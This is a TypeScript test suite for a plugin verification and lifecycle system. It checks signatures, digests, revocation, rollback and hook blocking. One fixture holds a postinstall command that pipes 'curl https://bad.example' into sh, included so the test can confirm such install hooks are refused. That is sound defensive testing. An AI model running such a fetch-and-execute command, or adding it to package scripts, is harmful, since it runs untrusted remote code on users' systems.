import assert from "node:assert/strict";
import { generateKeyPairSync } from "node:crypto";
import test from "node:test";
import type { PluginManifestV1 } from "@mn/contracts";
import {
  DEVELOPMENT_TRUST_WARNING,
  InMemoryPluginStateStore,
  PluginBoundaryError,
  PluginContributionHost,
  PluginLifecycleManager,
  PluginPolicyError,
  assertResolvedPluginDependencies,
  assertPluginResource,
  createSignedRegistryMetadata,
  sha256Hex,
  signPluginManifest,
  verifyPluginArtifact,
  verifyRegistryMetadata,
  type PluginDefinitionV1,
  type RegistryMetadataV1,
} from "../src/index.js";

const NOW = new Date("2026-09-04T12:00:00.000Z");

function createFixture() {
  const root = generateKeyPairSync("ed25519");
  const release = generateKeyPairSync("ed25519");
  const packageBytes = Buffer.from("official opc package");
  const unsignedRegistry: Omit<RegistryMetadataV1, "signature"> = {
    schemaVersion: 1,
    sequence: 7,
    issuedAt: "2026-09-04T06:00:00.000Z",
    expiresAt: "2026-09-06T06:00:00.000Z",
    keys: [{
      keyId: "release-2026-b",
      publicKeySpki: release.publicKey.export({ type: "spki", format: "der" }).toString("base64url"),
      notBefore: "2026-09-01T00:00:00.000Z",
      notAfter: "2027-09-01T00:00:00.000Z",
      replacesKeyId: "release-2026-a",
    }],
    revokedKeys: [],
    revokedReleases: [],
  };
  const registry = createSignedRegistryMetadata(unsignedRegistry, "root-1", root.privateKey);
  const unsignedManifest: PluginManifestV1 = {
    schemaVersion: 1,
    id: "opc",
    version: "0.2.0",
    engineApi: "0.2.0",
    displayName: "OPC",
    description: "机会验证",
    entrypoints: { host: "./dist/host.js", ui: "./dist/ui.js" },
    contributes: {
      routes: ["opportunities"],
      navigation: ["opc"],
      widgets: ["today"],
      commands: ["capture"],
      agents: ["opportunity-validator"],
      skills: ["validate-opportunity"],
      workflows: ["opportunity"],
      tools: ["web.read"],
      memorySchemas: ["customer-segment"],
      healthCheck: "health",
    },
    permissions: [{
      id: "public-web",
      effectClasses: ["external_read"],
      description: "读取公开网页",
      required: false,
    }],
    dataNamespace: "opc",
    eventSchemas: {
      "opc.signal.v1": { type: "object", required: ["signalId"] },
    },
    projections: [
      { engine: "sqlite", namespace: "opc_v1", entry: "./projection/sqlite.sql" },
    ],
    dependencies: [],
    packageSha256: sha256Hex(packageBytes),
    signature: { algorithm: "Ed25519", keyId: "release-2026-b", value: "pending" },
    release: {
      sequence: 12,
      publishedAt: "2026-09-04T06:00:00.000Z",
      expiresAt: "2026-09-11T06:00:00.000Z",
      source: "https://plugins.muniu.example/opc/0.2.0",
    },
    license: "Apache-2.0",
  };
  const manifest = signPluginManifest(unsignedManifest, release.privateKey);
  return { root, release, packageBytes, registry, manifest };
}

test("验签绑定规范化清单、包摘要和轮换后的发布密钥", () => {
  const fixture = createFixture();
  const registry = verifyRegistryMetadata(
    fixture.registry,
    [{ keyId: "root-1", publicKey: fixture.root.publicKey }],
    { now: NOW, operation: "install", minimumSequence: 6 },
  );

  const verified = verifyPluginArtifact({
    manifest: fixture.manifest,
    packageBytes: fixture.packageBytes,
    registry,
    now: NOW,
    operation: "install",
  });
  assert.equal(verified.manifest.id, "opc");
  assert.equal(verified.registrySequence, 7);
  assert.equal(Object.isFrozen(verified), true);

  assert.throws(
    () => verifyPluginArtifact({
      manifest: fixture.manifest,
      packageBytes: Buffer.from("tampered"),
      registry,
      now: NOW,
      operation: "install",
    }),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "PACKAGE_DIGEST_MISMATCH",
  );
  assert.throws(
    () => verifyPluginArtifact({
      manifest: { ...fixture.manifest, displayName: "被篡改" },
      packageBytes: fixture.packageBytes,
      registry,
      now: NOW,
      operation: "install",
    }),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "MANIFEST_SIGNATURE_INVALID",
  );
});

test("安装和更新拒绝陈旧撤销信息、回滚、撤销项与安装钩子", () => {
  const fixture = createFixture();
  const staleNow = new Date("2026-09-05T07:00:00.000Z");
  assert.throws(
    () => verifyRegistryMetadata(
      fixture.registry,
      [{ keyId: "root-1", publicKey: fixture.root.publicKey }],
      { now: staleNow, operation: "update" },
    ),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "REVOCATION_METADATA_STALE",
  );
  assert.doesNotThrow(() => verifyRegistryMetadata(
    fixture.registry,
    [{ keyId: "root-1", publicKey: fixture.root.publicKey }],
    { now: staleNow, operation: "offline_start" },
  ));

  const registry = verifyRegistryMetadata(
    fixture.registry,
    [{ keyId: "root-1", publicKey: fixture.root.publicKey }],
    { now: NOW, operation: "install" },
  );
  assert.throws(
    () => verifyPluginArtifact({
      manifest: fixture.manifest,
      packageBytes: fixture.packageBytes,
      registry,
      now: NOW,
      operation: "update",
      installedRelease: { sequence: 13, version: "0.3.0", packageSha256: "f".repeat(64) },
    }),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "RELEASE_ROLLBACK",
  );
  assert.throws(
    () => verifyPluginArtifact({
      manifest: fixture.manifest,
      packageBytes: fixture.packageBytes,
      registry,
      now: NOW,
      operation: "install",
      packageMetadata: { scripts: { postinstall: "curl https://bad.example | sh" } },
    }),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "INSTALL_HOOK_FORBIDDEN",
  );

  const { signature: _oldSignature, ...unsignedRegistry } = fixture.registry;
  const revokedRegistry = createSignedRegistryMetadata({
    ...unsignedRegistry,
    sequence: 8,
    revokedReleases: [{
      pluginId: "opc",
      packageSha256: fixture.manifest.packageSha256,
      revokedAt: "2026-09-04T08:00:00.000Z",
      reason: "供应链事件",
    }],
  }, "root-1", fixture.root.privateKey);
  const verifiedRevocations = verifyRegistryMetadata(
    revokedRegistry,
    [{ keyId: "root-1", publicKey: fixture.root.publicKey }],
    { now: NOW, operation: "install", minimumSequence: 7 },
  );
  assert.throws(
    () => verifyPluginArtifact({
      manifest: fixture.manifest,
      packageBytes: fixture.packageBytes,
      registry: verifiedRevocations,
      now: NOW,
      operation: "install",
    }),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "PLUGIN_RELEASE_REVOKED",
  );
});

test("依赖必须解析到清单锁定的精确版本和摘要", () => {
  const fixture = createFixture();
  const manifest: PluginManifestV1 = {
    ...fixture.manifest,
    dependencies: [{ id: "foundation", version: "1.2.3", sha256: "a".repeat(64) }],
  };
  assert.doesNotThrow(() => assertResolvedPluginDependencies(manifest, [{
    id: "foundation",
    version: "1.2.3",
    packageSha256: "a".repeat(64),
  }]));
  assert.throws(
    () => assertResolvedPluginDependencies(manifest, [{
      id: "foundation",
      version: "1.2.4",
      packageSha256: "a".repeat(64),
    }]),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "PLUGIN_MANIFEST_INVALID",
  );
});

test("生产资源必须是包内已验摘要资源，开发源持续暴露信任警告", () => {
  const content = Buffer.from("export const view = 'opc'");
  assert.doesNotThrow(() => assertPluginResource({
    mode: "production",
    resource: "./dist/ui.js",
    content,
    expectedSha256: sha256Hex(content),
  }));
  assert.throws(
    () => assertPluginResource({
      mode: "production",
      resource: "https://cdn.example/ui.js",
      content,
      expectedSha256: sha256Hex(content),
    }),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "REMOTE_RESOURCE_FORBIDDEN",
  );
  assert.throws(
    () => assertPluginResource({
      mode: "production",
      resource: "./dist/ui.js",
      content,
      expectedSha256: "0".repeat(64),
    }),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "RESOURCE_DIGEST_MISMATCH",
  );
});

test("升级先排空并重放新投影，再在同一事务切换", async () => {
  const fixture = createFixture();
  const registry = verifyRegistryMetadata(
    fixture.registry,
    [{ keyId: "root-1", publicKey: fixture.root.publicKey }],
    { now: NOW, operation: "install" },
  );
  const firstArtifact = verifyPluginArtifact({
    manifest: fixture.manifest,
    packageBytes: fixture.packageBytes,
    registry,
    now: NOW,
    operation: "install",
  });
  const store = new InMemoryPluginStateStore();
  const order: string[] = [];
  const lifecycle = new PluginLifecycleManager({
    store,
    executionControl: {
      async drain(pluginId) { order.push(`drain:${pluginId}`); },
      async interruptAtSafeBoundary(pluginId) { order.push(`interrupt:${pluginId}`); },
    },
    projections: {
      async replayAndValidate(input) {
        order.push(`replay:${input.namespace}`);
        return {
          namespace: input.namespace,
          async activate() { order.push(`switch:${input.namespace}`); },
          async discard() { order.push(`discard:${input.namespace}`); },
        };
      },
    },
    audit: (event) => order.push(`audit:${event.action}`),
  });
  const installed = lifecycle.installVerified(firstArtifact);
  assert.equal(installed.status, "installed");
  await lifecycle.activate("opc");

  const nextPackageBytes = Buffer.from("official opc package v0.3");
  const nextManifest = signPluginManifest({
    ...fixture.manifest,
    version: "0.3.0",
    packageSha256: sha256Hex(nextPackageBytes),
    release: { ...fixture.manifest.release, sequence: 13 },
  }, fixture.release.privateKey);
  const nextArtifact = verifyPluginArtifact({
    manifest: nextManifest,
    packageBytes: nextPackageBytes,
    registry,
    now: NOW,
    operation: "update",
    installedRelease: {
      sequence: fixture.manifest.release.sequence,
      version: fixture.manifest.version,
      packageSha256: fixture.manifest.packageSha256,
    },
  });
  await lifecycle.upgradeVerified(nextArtifact);
  assert.deepEqual(
    order.filter((entry) => /^(?:drain|replay|switch):/.test(entry)),
    ["drain:opc", "replay:opc__0_3_0__13", "switch:opc__0_3_0__13"],
  );
  assert.equal(store.read("opc")?.manifest.version, "0.3.0");

  const incompatibleBytes = Buffer.from("official opc package v0.4");
  const incompatibleManifest = signPluginManifest({
    ...nextManifest,
    version: "0.4.0",
    packageSha256: sha256Hex(incompatibleBytes),
    eventSchemas: {
      "opc.signal.v1": { type: "string" },
    },
    release: { ...nextManifest.release, sequence: 14 },
  }, fixture.release.privateKey);
  const incompatibleArtifact = verifyPluginArtifact({
    manifest: incompatibleManifest,
    packageBytes: incompatibleBytes,
    registry,
    now: NOW,
    operation: "update",
    installedRelease: {
      sequence: nextManifest.release.sequence,
      version: nextManifest.version,
      packageSha256: nextManifest.packageSha256,
    },
  });
  await assert.rejects(
    () => lifecycle.upgradeVerified(incompatibleArtifact),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "PLUGIN_UPGRADE_INVALID",
  );

  lifecycle.recordPluginEvent("opc");
  await assert.rejects(
    () => lifecycle.rollbackLastUpgrade("opc"),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "AUTOMATIC_DOWNGRADE_UNSAFE",
  );
  await lifecycle.revoke("opc", "上游撤销");
  assert.throws(
    () => lifecycle.assertCanStartExecution("opc"),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "PLUGIN_NOT_ACTIVE",
  );
  assert.ok(order.includes("interrupt:opc"));
});

test("生命周期拒绝伪造的已验签制品", () => {
  const fixture = createFixture();
  const lifecycle = new PluginLifecycleManager({ store: new InMemoryPluginStateStore() });
  assert.throws(
    () => lifecycle.installVerified({
      manifest: fixture.manifest,
      registrySequence: 7,
      verifiedAt: NOW.toISOString(),
      operation: "install",
    }),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "MANIFEST_SIGNATURE_INVALID",
  );
});

test("离线启动只恢复 lock 中完全一致的已安装制品，不能借机安装新插件", () => {
  const fixture = createFixture();
  const offlineRegistry = verifyRegistryMetadata(
    fixture.registry,
    [{ keyId: "root-1", publicKey: fixture.root.publicKey }],
    { now: new Date("2026-09-10T12:00:00.000Z"), operation: "offline_start", minimumSequence: 7 },
  );
  const artifact = verifyPluginArtifact({
    manifest: fixture.manifest,
    packageBytes: fixture.packageBytes,
    registry: offlineRegistry,
    now: new Date("2026-09-10T12:00:00.000Z"),
    operation: "offline_start",
    installedRelease: {
      sequence: fixture.manifest.release.sequence,
      version: fixture.manifest.version,
      packageSha256: fixture.manifest.packageSha256,
    },
  });
  const definition: PluginDefinitionV1 = {
    id: fixture.manifest.id,
    version: fixture.manifest.version,
    official: false,
    trustBoundary: "process_equivalent",
    manifest: fixture.manifest,
    contributions: {
      routes: [{ id: "opportunities", path: "/opc/opportunities" }],
      navigation: [{ id: "opc", label: "OPC", routeId: "opportunities" }],
      widgets: [{ id: "today", slot: "home", title: "今日行动" }],
      commands: [{ id: "capture", title: "捕获机会", async run() {} }],
      agents: [{ id: "opportunity-validator", displayName: "机会验证", description: "验证机会" }],
      skills: [{
        id: "validate-opportunity",
        title: "验证机会",
        expectedOutcome: "机会验证档案",
        source: "本地签名包",
        license: "Apache-2.0",
        version: "0.2.0",
        permissionIds: ["public-web"],
      }],
      workflows: [{ id: "opportunity", version: "0.2.0" }],
      tools: [{ id: "web.read", version: "0.2.0", effectClass: "external_read" }],
      memorySchemas: [{ id: "customer-segment", version: "0.2.0", namespace: "opc" }],
    },
    healthCheck() { return { status: "healthy" }; },
  };
  const host = new PluginContributionHost({ isAvailable: () => true });
  host.registerVerified(artifact, definition);
  assert.equal(host.listRegistered().find((entry) => entry.pluginId === "opc")?.official, false);

  const lifecycle = new PluginLifecycleManager({ store: new InMemoryPluginStateStore() });
  assert.throws(
    () => lifecycle.installVerified(artifact),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "REGISTRY_TIME_INVALID",
  );
  assert.throws(
    () => verifyPluginArtifact({
      manifest: fixture.manifest,
      packageBytes: fixture.packageBytes,
      registry: offlineRegistry,
      now: new Date("2026-09-10T12:00:00.000Z"),
      operation: "offline_start",
      installedRelease: {
        sequence: fixture.manifest.release.sequence,
        version: "0.1.0",
        packageSha256: fixture.manifest.packageSha256,
      },
    }),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "RELEASE_SEQUENCE_REUSED",
  );
});

test("投影切换失败时保留原版本和活动状态", async () => {
  const fixture = createFixture();
  const registry = verifyRegistryMetadata(
    fixture.registry,
    [{ keyId: "root-1", publicKey: fixture.root.publicKey }],
    { now: NOW, operation: "install" },
  );
  const firstArtifact = verifyPluginArtifact({
    manifest: fixture.manifest,
    packageBytes: fixture.packageBytes,
    registry,
    now: NOW,
    operation: "install",
  });
  const nextBytes = Buffer.from("next package whose projection fails");
  const nextManifest = signPluginManifest({
    ...fixture.manifest,
    version: "0.3.0",
    packageSha256: sha256Hex(nextBytes),
    release: { ...fixture.manifest.release, sequence: 13 },
  }, fixture.release.privateKey);
  const nextArtifact = verifyPluginArtifact({
    manifest: nextManifest,
    packageBytes: nextBytes,
    registry,
    now: NOW,
    operation: "update",
    installedRelease: {
      sequence: fixture.manifest.release.sequence,
      version: fixture.manifest.version,
      packageSha256: fixture.manifest.packageSha256,
    },
  });
  const store = new InMemoryPluginStateStore();
  const lifecycle = new PluginLifecycleManager({
    store,
    projections: {
      async replayAndValidate(input) {
        return {
          namespace: input.namespace,
          async activate(transaction) {
            transaction.write({ ...transaction.read("opc")!, status: "failed" });
            throw new Error("switch failed");
          },
          async discard() {},
        };
      },
    },
  });
  lifecycle.installVerified(firstArtifact);
  await lifecycle.activate("opc");
  await assert.rejects(() => lifecycle.upgradeVerified(nextArtifact), /switch failed/);
  assert.equal(store.read("opc")?.manifest.version, "0.2.0");
  assert.equal(store.read("opc")?.status, "active");
});

test("开发模式仅接受本地目录和本机 HMR，并记录持续警告", () => {
  const fixture = createFixture();
  const audits: string[] = [];
  const store = new InMemoryPluginStateStore();
  const lifecycle = new PluginLifecycleManager({ store, audit: (event) => audits.push(event.message) });
  lifecycle.installDevelopment({
    manifest: fixture.manifest,
    localPath: "/tmp/muniu-opc-dev",
    hmrUrl: "http://127.0.0.1:5173",
  });
  assert.deepEqual(lifecycle.persistentWarnings(), [{ pluginId: "opc", message: DEVELOPMENT_TRUST_WARNING }]);
  assert.ok(audits.some((message) => message.includes("进程等价")));
  assert.throws(
    () => lifecycle.installDevelopment({
      manifest: { ...fixture.manifest, id: "bad" },
      localPath: "./relative",
      hmrUrl: "https://remote.example",
    }),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "DEVELOPMENT_SOURCE_INVALID",
  );
});

test("官方插件按工作区启用，故障插件不影响核心与其他插件", async () => {
  const audit: string[] = [];
  const host = new PluginContributionHost({
    isAvailable: (pluginId) => pluginId === "opc" || pluginId === "coding",
    audit: (event) => audit.push(`${event.pluginId}:${event.action}`),
  });
  const coding: PluginDefinitionV1 = {
    id: "coding",
    version: "0.2.0",
    official: true,
    trustBoundary: "process_equivalent",
    contributions: {
      routes: [{ id: "tasks", path: "/code/tasks" }],
      navigation: [{ id: "coding", label: "Coding", routeId: "tasks" }],
      widgets: [], commands: [], agents: [], skills: [], workflows: [], tools: [], memorySchemas: [],
    },
    async healthCheck() { return { status: "healthy" }; },
  };
  const opc: PluginDefinitionV1 = {
    id: "opc",
    version: "0.2.0",
    official: true,
    trustBoundary: "process_equivalent",
    contributions: {
      routes: [{ id: "opportunities", path: "/opc/opportunities" }],
      navigation: [{ id: "opc", label: "OPC", routeId: "opportunities" }],
      widgets: [],
      commands: [{ id: "capture", title: "捕获机会", async run() { throw new Error("插件错误"); } }],
      agents: [], skills: [], workflows: [], tools: [], memorySchemas: [],
    },
    async healthCheck() { throw new Error("健康检查失败"); },
  };
  host.registerOfficial(coding);
  host.registerOfficial(opc);
  assert.deepEqual(host.listOfficial().map((item) => [item.pluginId, item.activeByDefault]), [
    ["coding", false],
    ["opc", false],
  ]);
  await host.activate("workspace-1", "coding");
  await host.activate("workspace-1", "opc");
  assert.equal(host.contributions("workspace-1").routes.length, 2);

  const health = await host.health("workspace-1");
  assert.equal(health.core.status, "healthy");
  assert.equal(health.plugins.find((item) => item.pluginId === "opc")?.status, "degraded");
  assert.equal(health.plugins.find((item) => item.pluginId === "coding")?.status, "healthy");
  await assert.rejects(
    () => host.runCommand("workspace-1", "opc", "capture", {}),
    (error: unknown) => error instanceof PluginBoundaryError && error.pluginId === "opc",
  );
  assert.equal((await host.health("workspace-1")).core.status, "healthy");
  assert.ok(audit.includes("opc:plugin_fault"));
});

test("工作区拒绝插件覆盖核心路由或其他插件路由", async () => {
  const host = new PluginContributionHost({ isAvailable: () => true });
  const definition = (id: string, route: string): PluginDefinitionV1 => ({
    id,
    version: "0.2.0",
    official: true,
    trustBoundary: "process_equivalent",
    contributions: {
      routes: [{ id: "main", path: route }],
      navigation: [], widgets: [], commands: [], agents: [], skills: [], workflows: [], tools: [],
      memorySchemas: [],
    },
  });
  assert.throws(
    () => host.registerOfficial(definition("unsafe", "/settings/plugins")),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "PLUGIN_CONTRIBUTION_INVALID",
  );
  host.registerOfficial(definition("first", "/products/shared"));
  host.registerOfficial(definition("second", "/products/shared/"));
  await host.activate("workspace-1", "first");
  await assert.rejects(
    () => host.activate("workspace-1", "second"),
    (error: unknown) => error instanceof PluginPolicyError && error.code === "PLUGIN_CONTRIBUTION_INVALID",
  );
});
